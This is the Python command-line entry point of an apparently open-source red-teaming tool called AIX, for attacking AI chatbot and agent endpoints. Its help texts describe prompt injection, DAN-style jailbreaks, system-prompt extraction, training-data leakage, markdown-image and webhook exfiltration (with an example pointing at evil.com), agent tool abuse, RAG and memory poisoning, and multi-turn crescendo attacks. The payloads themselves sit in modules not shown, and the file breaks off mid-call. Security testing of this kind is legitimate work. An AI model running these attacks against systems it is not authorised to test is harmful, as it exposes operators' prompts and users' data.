#!/usr/bin/env python3
"""
    ▄▀█ █ ▀▄▀
    █▀█ █ █ █  

    AI eXploit Framework
    The first comprehensive AI/LLM security testing tool
    
    "NetExec for AI" - Test any AI endpoint like a pro
"""

import os
import sys

import click
from rich.console import Console

from aix import __version__
from aix.core.request_parser import RequestParseError, load_request
from aix.db.database import AIXDatabase
from aix.utils.cli import standard_options, common_options, refresh_options, scan_options
from aix.modules import agent, chain, dos, exfil, extract, fuzz, inject, jailbreak, leak, memory, multiturn, rag, recon

console = Console()

BANNER = f"""
[bold cyan]    ▄▀█ █ ▀▄▀[/bold cyan]
[bold cyan]    █▀█ █ █ █[/bold cyan]  [dim]v{__version__}[/dim]
    
[dim]    AI Security Testing Framework[/dim]
[dim]    Maintained as an open source project by @r08t[/dim]
"""


def print_banner():
    console.print(BANNER)


def _set_proxy_env(proxy: str | None) -> None:
    """Set HTTP(S)_PROXY env vars when proxy is provided.

    Accepts forms like host:port or http://host:port
    """
    if not proxy:
        return
    proxy_url = proxy
    if not proxy_url.startswith('http://') and not proxy_url.startswith('https://'):
        proxy_url = 'http://' + proxy_url
    os.environ['HTTP_PROXY'] = proxy_url
    os.environ['HTTPS_PROXY'] = proxy_url


def validate_input(target, request, param):
    """
    Validate that either target URL or request file is provided.
    Returns (target_url, parsed_request) tuple.
    """
    if not target and not request:
        console.print("[red][-][/red] Error: Either TARGET or --request/-r is required")
        raise click.Abort()

    if target and request:
        console.print("[red][-][/red] Error: Cannot specify both TARGET and --request/-r")
        raise click.Abort()

    parsed_request = None
    if request:
        if not param:
            console.print("[red][-][/red] Error: --param/-p is required when using --request/-r")
            raise click.Abort()
        try:
            parsed_request = load_request(request, param)
            target = parsed_request.url
        except RequestParseError as e:
            console.print(f"[red][-][/red] Error parsing request file: {e}")
            raise click.Abort()

    return target, parsed_request


@click.group(invoke_without_command=True)
@click.option('--version', '-V', is_flag=True, help='Show version')
@click.pass_context
def main(ctx, version):
    """
    AIX - AI eXploit Framework

    The first comprehensive AI/LLM security testing tool.
    Test any AI endpoint for vulnerabilities.

    Now supports HTTP proxies, Burp Suite request parsing, and externalized payloads.

    \b
    Examples:
        aix recon https://company.com/chatbot
        aix inject https://api.openai.com/v1/chat -k sk-xxx
        aix jailbreak https://chat.company.com
        aix extract --profile company.com
    """
    if version:
        console.print(f"[bold cyan]AIX[/bold cyan] version [green]{__version__}[/green]")
        sys.exit(0)

    if ctx.invoked_subcommand is None:
        print_banner()
        console.print(ctx.get_help())


# ============================================================================
# RECON MODULE
# ============================================================================
@main.command()
@standard_options
@click.option('--timeout', '-t', default=30, help='Request timeout in seconds')
@click.option('--evasion', '-e', type=click.Choice(['none', 'light', 'aggressive']), default='none', help='Evasion level')
def recon_cmd(target, request, param, output, timeout, verbose, proxy, cookie, headers, format, refresh_url, refresh_regex, refresh_param, refresh_error, response_regex, ai, ai_key, ai_model, no_eval, no_context, evasion, level, risk, show_response, verify_attempts, key=None, profile=None):
    """
    Reconnaissance - Discover AI endpoint details

    \b
    Analyzes target to find:
    - API endpoints and methods
    - Authentication mechanisms
    - Input filters and WAF
    - Model fingerprinting (signatures and capabilities)
    - Rate limits and timeouts

    \b
    Examples:
        aix recon https://company.com/chatbot
        aix recon -r request.txt -p "messages[0].content"
        aix recon https://api.company.com -o profile.json
        aix recon https://api.company.com --ai openai --ai-key sk-xxx
    """
    print_banner()
    target, parsed_request = validate_input(target, request, param)

    # Build AI config if --ai is provided
    ai_config = None
    if ai:
        ai_config = {
            'provider': ai,
            'api_key': ai_key or key,
            'model': ai_model,
            'enable_eval': not no_eval,
            'enable_context': not no_context,
        }

    recon.run(target, output=output, timeout=timeout, verbose=verbose, evasion=evasion,
              parsed_request=parsed_request, proxy=proxy, cookies=cookie, headers=headers,
              injection_param=param, body_format=format,
              refresh_config={'url': refresh_url, 'regex': refresh_regex, 'param': refresh_param, 'error': refresh_error},
              response_regex=response_regex,
              ai_config=ai_config,
              level=level, risk=risk, show_response=show_response, verify_attempts=verify_attempts)


# Alias for recon
main.add_command(recon_cmd, name='recon')





# ============================================================================
# INJECT MODULE
# ============================================================================
@main.command()
@standard_options
@click.option('--targets', '-T', help='File with multiple targets')
@click.option('--evasion', '-e', type=click.Choice(['none', 'light', 'aggressive']), default='light', help='Evasion level')
@click.option('--payloads', help='Custom payloads file')
@click.option('--threads', default=5, help='Number of threads')
def inject_cmd(target, request, param, key, profile, targets, evasion, payloads, threads, verbose, output, proxy, cookie, headers, format, refresh_url, refresh_regex, refresh_param, refresh_error, response_regex, ai, ai_key, ai_model, no_eval, no_context, level, risk, show_response, verify_attempts):
    """
    Inject - Prompt injection attacks

    \b
    Test for prompt injection vulnerabilities:
    - Direct injection
    - Indirect injection
    - Context manipulation
    - Instruction override

    \b
    Examples:
        aix inject https://api.target.com -k sk-xxx
        aix inject -r request.txt -p "messages[0].content"
        aix inject --profile company.com
        aix inject -T targets.txt --evasion aggressive
        aix inject https://api.target.com --ai openai --ai-key sk-xxx
    """
    print_banner()
    target, parsed_request = validate_input(target, request, param)

    # Build AI config if --ai is provided
    ai_config = None
    if ai:
        ai_config = {
            'provider': ai,
            'api_key': ai_key or key,
            'model': ai_model,
            'enable_eval': not no_eval,
            'enable_context': not no_context,
        }

    inject.run(
        target=target, api_key=key, profile=profile, targets_file=targets,
        evasion=evasion, payloads_file=payloads,
        threads=threads, verbose=verbose, output=output,
        parsed_request=parsed_request, proxy=proxy, cookies=cookie, headers=headers,
        injection_param=param, body_format=format,
        refresh_config={'url': refresh_url, 'regex': refresh_regex, 'param': refresh_param, 'error': refresh_error},
        response_regex=response_regex,
        ai_config=ai_config,
        level=level, risk=risk, show_response=show_response, verify_attempts=verify_attempts
    )


main.add_command(inject_cmd, name='inject')


# ============================================================================
# JAILBREAK MODULE
# ============================================================================
@main.command()
@standard_options
@click.option('--evasion', '-e', type=click.Choice(['none', 'light', 'aggressive']), default='light', help='Evasion level')
@click.option('--test-harmful', is_flag=True, help='Test harmful content generation')
def jailbreak_cmd(target, request, param, key, profile, evasion, test_harmful, verbose, output, proxy, cookie, headers, format, refresh_url, refresh_regex, refresh_param, refresh_error, response_regex, ai, ai_key, ai_model, no_eval, no_context, level, risk, show_response, verify_attempts):
    """
    Jailbreak - Bypass AI restrictions

    \b
    Test restriction bypass techniques:
    - DAN variants (v1-v15)
    - Character roleplay
    - Developer mode
    - Hypothetical framing

    \b
    Examples:
        aix jailbreak -r request.txt -p "messages[0].content"
        aix jailbreak --profile company.com --test-harmful
        aix jailbreak https://api.target.com --ai openai --ai-key sk-xxx
    """
    print_banner()
    target, parsed_request = validate_input(target, request, param)
    # Build AI config if --ai is provided
    ai_config = None
    if ai:
        ai_config = {
            'provider': ai,
            'api_key': ai_key or key,
            'model': ai_model,
            'enable_eval': not no_eval,
            'enable_context': not no_context,
        }

    jailbreak.run(
        target=target, api_key=key, profile=profile,
        evasion=evasion, test_harmful=test_harmful, verbose=verbose, output=output,
        parsed_request=parsed_request, proxy=proxy, cookies=cookie, headers=headers,
        injection_param=param, body_format=format,
        refresh_config={'url': refresh_url, 'regex': refresh_regex, 'param': refresh_param, 'error': refresh_error},
        response_regex=response_regex,
        ai_config=ai_config,
        level=level, risk=risk, show_response=show_response, verify_attempts=verify_attempts
    )


main.add_command(jailbreak_cmd, name='jailbreak')


# ============================================================================
# EXTRACT MODULE
# ============================================================================
@main.command()
@standard_options
@click.option('--evasion', '-e', type=click.Choice(['none', 'light', 'aggressive']), default='none', help='Evasion level')
def extract_cmd(target, request, param, key, profile, verbose, output, proxy, cookie, headers, format, refresh_url, refresh_regex, refresh_param, refresh_error, response_regex, ai, ai_key, ai_model, no_eval, no_context, evasion, level, risk, show_response, verify_attempts):
    """
    Extract - System prompt extraction

    \b
    Extract hidden system prompts:
    - Direct extraction techniques
    - Roleplay extraction
    - Translation tricks
    - Repeat/format abuse

    \b
    Examples:
        aix extract https://api.target.com -k sk-xxx
        aix extract -r request.txt -p "messages[0].content"
        aix extract --profile company.com --evasion aggressive
        aix extract https://api.target.com --ai openai --ai-key sk-xxx
    """
    print_banner()
    target, parsed_request = validate_input(target, request, param)
    # Build AI config if --ai is provided
    ai_config = None
    if ai:
        ai_config = {
            'provider': ai,
            'api_key': ai_key or key,
            'model': ai_model,
            'enable_eval': not no_eval,
            'enable_context': not no_context,
        }

    extract.run(
        target=target, api_key=key, profile=profile,
        verbose=verbose, output=output, evasion=evasion,
        parsed_request=parsed_request, proxy=proxy, cookies=cookie, headers=headers,
        injection_param=param, body_format=format,
        refresh_config={'url': refresh_url, 'regex': refresh_regex, 'param': refresh_param, 'error': refresh_error},
        response_regex=response_regex,
        ai_config=ai_config,
        level=level, risk=risk, show_response=show_response, verify_attempts=verify_attempts
    )


main.add_command(extract_cmd, name='extract')


# ============================================================================
# LEAK MODULE
# ============================================================================
@main.command()
@standard_options
@click.option('--evasion', '-e', type=click.Choice(['none', 'light', 'aggressive']), default='none', help='Evasion level')
def leak_cmd(target, request, param, key, profile, verbose, output, proxy, cookie, headers, format, refresh_url, refresh_regex, refresh_param, refresh_error, response_regex, ai, ai_key, ai_model, no_eval, no_context, evasion, level, risk, show_response, verify_attempts):
    """
    Leak - Training data extraction

    \b
    Test for data leakage:
    - PII in responses
    - Memorized training data
    - RAG document leakage
    - Model architecture info

    \b
    Examples:
        aix leak https://api.target.com -k sk-xxx
        aix leak -r request.txt -p "messages[0].content"
        aix leak --profile company.com --evasion aggressive
        aix leak https://api.target.com --ai openai --ai-key sk-xxx
    """
    print_banner()
    target, parsed_request = validate_input(target, request, param)
    # Build AI config if --ai is provided
    ai_config = None
    if ai:
        ai_config = {
            'provider': ai,
            'api_key': ai_key or key,
            'model': ai_model,
            'enable_eval': not no_eval,
            'enable_context': not no_context,
        }

    leak.run(
        target=target, api_key=key, profile=profile,
        verbose=verbose, output=output, evasion=evasion,
        parsed_request=parsed_request, proxy=proxy, cookies=cookie, headers=headers,
        injection_param=param, body_format=format,
        refresh_config={'url': refresh_url, 'regex': refresh_regex, 'param': refresh_param, 'error': refresh_error},
        response_regex=response_regex,
        ai_config=ai_config,
        level=level, risk=risk, show_response=show_response, verify_attempts=verify_attempts
    )


main.add_command(leak_cmd, name='leak')


# ============================================================================
# EXFIL MODULE
# ============================================================================
@main.command()
@standard_options
@click.option('--webhook', '-w', help='Webhook URL for exfiltration testing')
@click.option('--evasion', '-e', type=click.Choice(['none', 'light', 'aggressive']), default='none', help='Evasion level')
def exfil_cmd(target, request, param, key, profile, webhook, verbose, output, proxy, cookie, headers, format, ai, ai_key, ai_model, no_eval, no_context, evasion, level, risk, show_response, verify_attempts, refresh_url=None, refresh_regex=None, refresh_param=None, refresh_error=None, response_regex=None):
    """
    Exfil - Data exfiltration testing

    \b
    Test data exfiltration channels:
    - Markdown image injection
    - Link injection
    - Hidden iframes
    - Webhook callbacks

    \b
    Examples:
        aix exfil https://api.target.com -k sk-xxx --webhook https://evil.com
        aix exfil -r request.txt -p "messages[0].content"
        aix exfil --profile company.com --evasion aggressive
        aix exfil https://api.target.com --ai openai --ai-key sk-xxx
    """
    print_banner()
    target, parsed_request = validate_input(target, request, param)
    # Build AI config if --ai is provided
    ai_config = None
    if ai:
        ai_config = {
            'provider': ai,
            'api_key': ai_key or key,
            'model': ai_model,
            'enable_eval': not no_eval,
            'enable_context': not no_context,
        }

    exfil.run(
        target=target, api_key=key, profile=profile, webhook=webhook,
        verbose=verbose, output=output, evasion=evasion,
        parsed_request=parsed_request, proxy=proxy, cookies=cookie, headers=headers,
        injection_param=param, body_format=format,
        ai_config=ai_config,
        level=level, risk=risk, show_response=show_response, verify_attempts=verify_attempts
    )


main.add_command(exfil_cmd, name='exfil')


# ============================================================================
# AGENT MODULE
# ============================================================================
@main.command()
@standard_options
@click.option('--evasion', '-e', type=click.Choice(['none', 'light', 'aggressive']), default='none', help='Evasion level')
def agent_cmd(target, request, param, key, profile, verbose, output, proxy, cookie, headers, format, refresh_url, refresh_regex, refresh_param, refresh_error, response_regex, ai, ai_key, ai_model, no_eval, no_context, evasion, level, risk, show_response, verify_attempts):
    """
    Agent - AI agent exploitation

    \b
    Test AI agent vulnerabilities:
    - Tool abuse
    - Unauthorized actions
    - Privilege escalation
    - Code execution

    \b
    Examples:
        aix agent https://agent.target.com -k sk-xxx
        aix agent -r request.txt -p "messages[0].content"
        aix agent --profile company.com --evasion aggressive
        aix agent https://api.target.com --ai openai --ai-key sk-xxx
    """
    print_banner()
    target, parsed_request = validate_input(target, request, param)
    # Build AI config if --ai is provided
    ai_config = None
    if ai:
        ai_config = {
            'provider': ai,
            'api_key': ai_key or key,
            'model': ai_model,
            'enable_eval': not no_eval,
            'enable_context': not no_context,
        }

    agent.run(
        target=target, api_key=key, profile=profile,
        verbose=verbose, output=output, evasion=evasion,
        parsed_request=parsed_request, proxy=proxy, cookies=cookie, headers=headers,
        injection_param=param, body_format=format,
        refresh_config={'url': refresh_url, 'regex': refresh_regex, 'param': refresh_param, 'error': refresh_error},
        response_regex=response_regex,
        ai_config=ai_config,
        level=level, risk=risk, show_response=show_response, verify_attempts=verify_attempts
    )


main.add_command(agent_cmd, name='agent')


# ============================================================================
# DOS MODULE
# ============================================================================
@main.command()
@standard_options
@click.option('--evasion', '-e', type=click.Choice(['none', 'light', 'aggressive']), default='none', help='Evasion level')
def dos_cmd(target, request, param, key, profile, verbose, output, proxy, cookie, headers, format, refresh_url, refresh_regex, refresh_param, refresh_error, response_regex, ai, ai_key, ai_model, no_eval, no_context, evasion, level, risk, show_response, verify_attempts):
    """
    DoS - Denial of Service testing

    \b
    Test resource exhaustion:
    - Token exhaustion
    - Rate limit testing
    - Infinite loop prompts
    - Memory exhaustion

    \b
    Examples:
        aix dos https://api.target.com -k sk-xxx
        aix dos -r request.txt -p "messages[0].content"
        aix dos --profile company.com --evasion aggressive
    """
    print_banner()
    target, parsed_request = validate_input(target, request, param)
    ai_config = None
    if ai:
        ai_config = {'provider': ai, 'api_key': ai_key or key, 'model': ai_model, 'enable_eval': not no_eval, 'enable_context': not no_context}

    dos.run(
        target=target, api_key=key, profile=profile,
        verbose=verbose, output=output, evasion=evasion,
        parsed_request=parsed_request, proxy=proxy, cookies=cookie, headers=headers,
        injection_param=param, body_format=format,
        refresh_config={'url': refresh_url, 'regex': refresh_regex, 'param': refresh_param, 'error': refresh_error},
        ai_config=ai_config,
        level=level, risk=risk, show_response=show_response, verify_attempts=verify_attempts
    )


main.add_command(dos_cmd, name='dos')


# ============================================================================
# FUZZ MODULE
# ============================================================================
@main.command()
@standard_options
@click.option('--iterations', '-i', default=100, help='Number of fuzz iterations')
@click.option('--evasion', '-e', type=click.Choice(['none', 'light', 'aggressive']), default='none', help='Evasion level')
def fuzz_cmd(target, request, param, key, profile, iterations, verbose, output, proxy, cookie, headers, format, refresh_url, refresh_regex, refresh_param, refresh_error, response_regex, ai, ai_key, ai_model, no_eval, no_context, evasion, level, risk, show_response, verify_attempts):
    """
    Fuzz - Fuzzing and edge cases

    \b
    Test edge cases and malformed input:
    - Unicode fuzzing
    - Format string attacks
    - Boundary testing
    - Encoding attacks

    \b
    Examples:
        aix fuzz https://api.target.com -k sk-xxx
        aix fuzz -r request.txt -p "messages[0].content"
        aix fuzz --profile company.com --iterations 500 --evasion aggressive
    """
    print_banner()
    target, parsed_request = validate_input(target, request, param)
    ai_config = None
    if ai:
        ai_config = {'provider': ai, 'api_key': ai_key or key, 'model': ai_model, 'enable_eval': not no_eval, 'enable_context': not no_context}

    fuzz.run(
        target=target, api_key=key, profile=profile,
        iterations=iterations, verbose=verbose, output=output, evasion=evasion,
        parsed_request=parsed_request, proxy=proxy, cookies=cookie, headers=headers,
        injection_param=param, body_format=format,
        refresh_config={'url': refresh_url, 'regex': refresh_regex, 'param': refresh_param, 'error': refresh_error},
        response_regex=response_regex,
        ai_config=ai_config,
        level=level, risk=risk, show_response=show_response
    )


main.add_command(fuzz_cmd, name='fuzz')


# ============================================================================
# MEMORY MODULE
# ============================================================================
@main.command()
@standard_options
@click.option('--evasion', '-e', type=click.Choice(['none', 'light', 'aggressive']), default='none', help='Evasion level')
def memory_cmd(target, request, param, key, profile, verbose, output, proxy, cookie, headers, format, refresh_url, refresh_regex, refresh_param, refresh_error, response_regex, ai, ai_key, ai_model, no_eval, no_context, evasion, level, risk, show_response, verify_attempts):
    """
    Memory - Memory and context manipulation attacks

    \b
    Test memory/context vulnerabilities:
    - Context window overflow
    - Conversation history poisoning
    - Persistent memory manipulation
    - Context bleeding between sessions
    - Recursive context attacks
    - Memory extraction

    \b
    Categories: overflow, poisoning, persistent, bleeding, recursive, extraction

    \b
    Examples:
        aix memory https://api.target.com -k sk-xxx
        aix memory -r request.txt -p "messages[0].content" --evasion aggressive
    """
    print_banner()
    target, parsed_request = validate_input(target, request, param)
    ai_config = None
    if ai:
        ai_config = {'provider': ai, 'api_key': ai_key or key, 'model': ai_model, 'enable_eval': not no_eval, 'enable_context': not no_context}

    memory.run(
        target=target, api_key=key, profile=profile,
        verbose=verbose, output=output, evasion=evasion,
        parsed_request=parsed_request, proxy=proxy, cookies=cookie, headers=headers,
        injection_param=param, body_format=format,
        refresh_config={'url': refresh_url, 'regex': refresh_regex, 'param': refresh_param, 'error': refresh_error},
        response_regex=response_regex,
        ai_config=ai_config,
        level=level, risk=risk, show_response=show_response, verify_attempts=verify_attempts
    )


main.add_command(memory_cmd, name='memory')


# ============================================================================
# RAG MODULE
# ============================================================================
@main.command()
@standard_options
@click.option('--evasion', '-e', type=click.Choice(['none', 'light', 'aggressive']), default='none', help='Evasion level')
def rag_cmd(target, request, param, key, profile, verbose, output, proxy, cookie, headers, format, refresh_url, refresh_regex, refresh_param, refresh_error, response_regex, ai, ai_key, ai_model, no_eval, no_context, evasion, level, risk, show_response, verify_attempts):
    """
    RAG - RAG-specific vulnerability testing

    \b
    Test RAG (Retrieval-Augmented Generation) vulnerabilities:
    - Indirect prompt injection via documents
    - Context poisoning attacks
    - Source/citation manipulation
    - Retrieval bypass techniques
    - Knowledge base extraction
    - Chunk boundary attacks

    \b
    Examples:
        aix rag https://api.target.com -k sk-xxx
        aix rag -r request.txt -p "messages[0].content"
        aix rag --profile company.com --evasion aggressive
        aix rag https://api.target.com --ai openai --ai-key sk-xxx
    """
    print_banner()
    target, parsed_request = validate_input(target, request, param)
    # Build AI config if --ai is provided
    ai_config = None
    if ai:
        ai_config = {
            'provider': ai,
            'api_key': ai_key or key,
            'model': ai_model,
            'enable_eval': not no_eval,
            'enable_context': not no_context,
        }

    rag.run(
        target=target, api_key=key, profile=profile,
        verbose=verbose, output=output, evasion=evasion,
        parsed_request=parsed_request, proxy=proxy, cookies=cookie, headers=headers,
        injection_param=param, body_format=format,
        refresh_config={'url': refresh_url, 'regex': refresh_regex, 'param': refresh_param, 'error': refresh_error},
        response_regex=response_regex,
        ai_config=ai_config,
        level=level, risk=risk, show_response=show_response, verify_attempts=verify_attempts
    )


main.add_command(rag_cmd, name='rag')


# ============================================================================
# MULTITURN MODULE
# ============================================================================
@main.command()
@standard_options
@click.option('--evasion', '-e', type=click.Choice(['none', 'light', 'aggressive']), default='none', help='Evasion level')
@click.option('--category', '-c', type=click.Choice(['all', 'crescendo', 'trust_building', 'context_poisoning', 'role_lock', 'memory_injection', 'instruction_layering', 'cognitive_overload', 'authority_transfer']), default='all', help='Attack category filter')
@click.option('--max-turns', default=10, help='Maximum turns per sequence')
@click.option('--turn-delay', default=0.5, help='Delay between turns in seconds')
def multiturn_cmd(target, request, param, key, profile, verbose, output, proxy, cookie, headers, format, refresh_url, refresh_regex, refresh_param, refresh_error, response_regex, ai, ai_key, ai_model, no_eval, no_context, evasion, level, risk, show_response, verify_attempts, category, max_turns, turn_delay):
    """
    Multi-Turn - Multi-turn conversation attacks

    \b
    Advanced attacks that exploit conversation context:
    - Crescendo (gradual escalation)
    - Trust building sequences
    - Context poisoning
    - Role lock exploitation
    - Memory injection
    - Instruction layering
    - Cognitive overload
    - Authority transfer

    \b
    Categories:
        crescendo          - Gradually escalate from benign to malicious
        trust_building     - Establish rapport before payload delivery
        context_poisoning  - Inject context early, trigger later
        role_lock          - Deep persona establishment and exploitation
        memory_injection   - Poison conversation memory/history
        instruction_layering - Stack partial instructions across turns
        cognitive_overload - Overwhelm with complexity before attack
        authority_transfer - Transfer perceived authority across turns

    \b
    Examples:
        aix multiturn https://api.target.com -k sk-xxx
        aix multiturn -r request.txt -p "messages[0].content"
        aix multiturn https://api.target.com --category crescendo --level 3
        aix multiturn --profile company.com --max-turns 5 --turn-delay 1.0
        aix multiturn https://api.target.com --ai openai --ai-key sk-xxx
    """
    print_banner()
    target, parsed_request = validate_input(target, request, param)
    # Build AI config if --ai is provided
    ai_config = None
    if ai:
        ai_config = {
            'provider': ai,
            'api_key': ai_key or key,
            'model': ai_model,
            'enable_eval': not no_eval,
            'enable_context': not no_context,
        }

    multiturn.run(
        target=target, api_key=key, profile=profile,
        verbose=verbose, output=output, evasion=evasion,
        parsed_request=parsed_request, proxy=proxy, cookies=cookie, headers=headers,
        injection_param=param, body_format=format,
        refresh_config={'url': refresh_url, 'regex': refresh_regex, 'param': refresh_param, 'error': refresh_error},
        response_regex=response_regex,
        ai_config=ai_config,
        level=level, risk=risk, show_response=show_response, verify_attempts=verify_attempts,
        category=category, max_turns=max_turns, turn_delay=turn_delay
    )


main.add_command(multiturn_cmd, name='multiturn')


# ============================================================================
# DATABASE COMMANDS
# ============================================================================
@main.command()
@click.option('--export', '-e', help='Export results to HTML report')
@click.option('--clear', is_flag=True, help='Clear all results')
@click.option('--target', '-t', help='Filter by target')
@click.option('--module', '-m', help='Filter by module')
def db(export, clear, target, module):
    """
    Database - View and manage results
    
    \b
    Examples:
        aix db
        aix db --export report.html
        aix db --target company.com
        aix db --clear
    """
    print_banner()

    db = AIXDatabase()

    if clear:
        if click.confirm('Are you sure you want to clear all results?'):
            db.clear()
            console.print("[green][+][/green] Database cleared")
        return

    if export:
        db.export_html(export, target=target, module=module)
        console.print(f"[green][+][/green] Report exported: {export}")
        return

    # Show results
    results = db.get_results(target=target, module=module)
    db.display_results(results)


# ============================================================================
# CHAIN COMMAND
# ============================================================================
@main.command()
@click.argument('target', required=False)
@click.option('--playbook', '-pb', help='Playbook file path or built-in name')
@click.option('--var', '-V', multiple=True, help='Variable override (key=value), can be used multiple times')
@click.option('--list', 'list_playbooks', is_flag=True, help='List available built-in playbooks')
@click.option('--dry-run', is_flag=True, help='Show execution plan without running')
@click.option('--visualize', is_flag=True, help='Show playbook as static graph')
@click.option('--export-mermaid', is_flag=True, help='Export playbook as Mermaid diagram')
@click.option('--mermaid-theme', type=click.Choice(['default', 'dark', 'forest', 'neutral']), default='default', help='Mermaid theme')
@click.option('--mermaid-direction', type=click.Choice(['TD', 'LR', 'BT', 'RL']), default='TD', help='Mermaid direction')
@click.option('--live/--no-live', default=True, help='Enable/disable live execution visualization')
@click.option('--request', '-r', help='Request file (Burp Suite format)')
@click.option('--param', '-p', help='Parameter path for injection (e.g., messages[0].content)')
@click.option('--key', '-k', help='API key for direct API access')
@click.option('--output', '-o', help='Output file for report (HTML or JSON)')
@click.option('--timeout', '-t', default=30, help='Request timeout in seconds')
@click.option('--verbose', '-v', count=True, help='Verbose output (-v: reasons, -vv: debug)')
@click.option('--proxy', help='Use HTTP proxy for outbound requests (host:port)')
@click.option('--cookie', '-C', help='Cookies for authentication (key=value; ...)')
@click.option('--headers', '-H', help='Custom headers (key:value; ...)')
@click.option('--format', '-F', type=click.Choice(['json', 'form', 'multipart']), default='json', help='Request body format')
@click.option('--refresh-url', help='URL to fetch new session ID if expired')
@click.option('--refresh-regex', help='Regex to extract session ID from refresh response')
@click.option('--refresh-param', help='Parameter to update with new session ID')
@click.option('--refresh-error', help='String/Regex in response body that triggers refresh')
@click.option('--response-regex', '-rr', help='Regex to extract specific content from response (matches last occurrence)')
@click.option('--eval-url', help='URL for secondary LLM evaluation')
@click.option('--eval-key', help='API key for secondary LLM')
@click.option('--eval-model', help='Model for secondary LLM')
@click.option('--eval-provider', help='Provider for secondary LLM (openai, anthropic, ollama, gemini)')
@click.option('--show-response', is_flag=True, help='Show AI response for findings')
@click.option('--verify-attempts', '-va', type=int, default=1, help='Number of verification attempts (confirmation)')
def chain_cmd(target, playbook, var, list_playbooks, dry_run, visualize, export_mermaid, mermaid_theme, mermaid_direction, live, request, param, key, output, timeout, verbose, proxy, cookie, headers, format, refresh_url, refresh_regex, refresh_param, refresh_error, response_regex, eval_url, eval_key, eval_model, eval_provider, show_response, verify_attempts):
    """
    Chain - Run attack chains from YAML playbooks

    \b
    Execute multi-step attack chains with:
    - Conditional branching
    - Context passing between steps
    - Variable interpolation (level, risk, evasion defined in playbook)
    - Live progress visualization

    \b
    Variables like level, risk, evasion are defined in the playbook's
    variables section. Override them with -V:

    \b
    Examples:
        aix chain --list
        aix chain --playbook full_compromise https://target.com -k sk-xxx
        aix chain --playbook full_compromise -V level=5 -V risk=3 https://target.com
        aix chain --playbook full_compromise -V evasion=aggressive https://target.com
        aix chain --playbook prompt_theft --dry-run https://target.com
        aix chain --playbook custom.yaml --visualize
        aix chain --playbook rag_pwn -o report.html https://target.com
        aix chain -r request.txt -p "messages[0].content" --playbook full_compromise
    """
    print_banner()
    _set_proxy_env(proxy)

    # Handle request file input
    parsed_request = None
    if request:
        if not param:
            console.print("[red][-][/red] Error: --param/-p is required when using --request/-r")
            raise click.Abort()
        try:
            parsed_request = load_request(request, param)
            target = parsed_request.url
        except RequestParseError as e:
            console.print(f"[red][-][/red] Error parsing request file: {e}")
            raise click.Abort()

    # Parse variable overrides
    variables = {}
    for v in var:
        if '=' in v:
            k, val = v.split('=', 1)
            # Try to parse as int/bool
            if val.lower() == 'true':
                variables[k] = True
            elif val.lower() == 'false':
                variables[k] = False
            else:
                try:
                    variables[k] = int(val)
                except ValueError:
                    variables[k] = val

    # Parse cookies and headers
    cookies_dict = None
    if cookie:
        cookies_dict = dict(c.split('=', 1) for c in cookie.split(';') if '=' in c)

    headers_dict = None
    if headers:
        headers_dict = dict(h.split(':', 1) for h in headers.split(';') if ':' in h)

    # Build refresh config
    refresh_config = None
    if refresh_url:
        refresh_config = {
            'url': refresh_url,
            'regex': refresh_regex,
            'param': refresh_param,
            'error': refresh_error
        }

    # Build eval config
    eval_config = None
    if eval_url or eval_provider:
        eval_config = {
            'url': eval_url,
            'api_key': eval_key,
            'model': eval_model,
            'provider': eval_provider
        }

    chain.run(
        target=target,
        api_key=key,
        playbook=playbook,
        variables=variables,
        dry_run=dry_run,
        visualize=visualize,
        export_mermaid=export_mermaid,
        mermaid_theme=mermaid_theme,
        mermaid_direction=mermaid_direction,
        list_playbooks=list_playbooks,
        live=live,
        verbose=verbose,
        output=output,
        parsed_request=parsed_request,
        proxy=proxy,
        cookies=cookies_dict,
        headers=headers_dict,
        injection_param=param,
        body_format=format,
        refresh_config=refresh_config,
        response_regex=response_regex,
        eval_config=eval_config,
        timeout=timeout,
        show_response=show_response,
        verify_attempts=verify_attempts,
    )


# ============================================================================
# SCAN ALL COMMAND
# ============================================================================
@main.command()
@click.argument('target', required=False)
@click.option('--request', '-r', help='Request file (Burp Suite format)')
@click.option('--param', '-p', help='Parameter path for injection (e.g., messages[0].content)')
@click.option('--key', '-k', help='API key for direct API access')
@click.option('--profile', '-P', help='Use saved profile')
@click.option('--evasion', '-e', type=click.Choice(['none', 'light', 'aggressive']), default='light', help='Evasion level')
@click.option('--output', '-o', help='Output file for results')
@click.option('--verbose', '-v', count=True, help='Verbose output (-v: reasons, -vv: debug)')
@click.option('--proxy', help='Use HTTP proxy for outbound requests (host:port)')
@click.option('--cookie', '-C', help='Cookies for authentication (key=value; ...)')
@click.option('--headers', '-H', help='Custom headers (key:value; ...)')
@click.option('--format', '-F', type=click.Choice(['json', 'form', 'multipart']), default='json', help='Request body format')
@click.option('--refresh-url', help='URL to fetch new session ID if expired')
@click.option('--refresh-regex', help='Regex to extract session ID from refresh response')
@click.option('--refresh-param', help='Parameter to update with new session ID')
@click.option('--refresh-error', help='String/Regex in response body that triggers refresh')
@click.option('--response-regex', '-rr', help='Regex to extract specific content from response (matches last occurrence)')
@click.option('--eval-url', help='URL for secondary LLM evaluation')
@click.option('--eval-key', help='API key for secondary LLM')
@click.option('--eval-model', help='Model for secondary LLM')
@click.option('--eval-provider', help='Provider for secondary LLM (openai, anthropic, ollama, gemini)')
@click.option('--level', type=int, default=1, help='Level of tests to perform (1-5)')
@click.option('--risk', type=int, default=1, help='Risk of tests to perform (1-3)')
@click.option('--show-response', is_flag=True, help='Show AI response for findings')
@click.option('--verify-attempts', '-va', type=int, default=1, help='Number of verification attempts (confirmation)')
def scan(target, request, param, key, profile, evasion, output, verbose, proxy, cookie, headers, format, refresh_url, refresh_regex, refresh_param, refresh_error, response_regex, eval_url, eval_key, eval_model, eval_provider, level, risk, show_response, verify_attempts):
    """
    Scan - Run all modules against target

    \b
    Comprehensive security scan:
    - Recon
    - Inject
    - Jailbreak
    - Extract
    - Leak
    - Exfil
    - Memory

    \b
    Examples:
        aix scan https://api.target.com -k sk-xxx
        aix scan -r request.txt -p "messages[0].content"
        aix scan --profile company.com --evasion aggressive
    """
    print_banner()
    _set_proxy_env(proxy)
    target, parsed_request = validate_input(target, request, param)

    console.print("[bold cyan][*][/bold cyan] Starting comprehensive scan...")
    console.print()

    # Run all modules
    modules_to_run = [
        ('recon', recon),
        ('inject', inject),
        ('jailbreak', jailbreak),
        ('extract', extract),
        ('leak', leak),
        ('exfil', exfil),
        ('memory', memory),
        ('rag', rag),
        ('multiturn', multiturn),
    ]

    for name, module in modules_to_run:
        console.print(f"[bold cyan][*][/bold cyan] Running {name} module...")
        try:
            module.run(
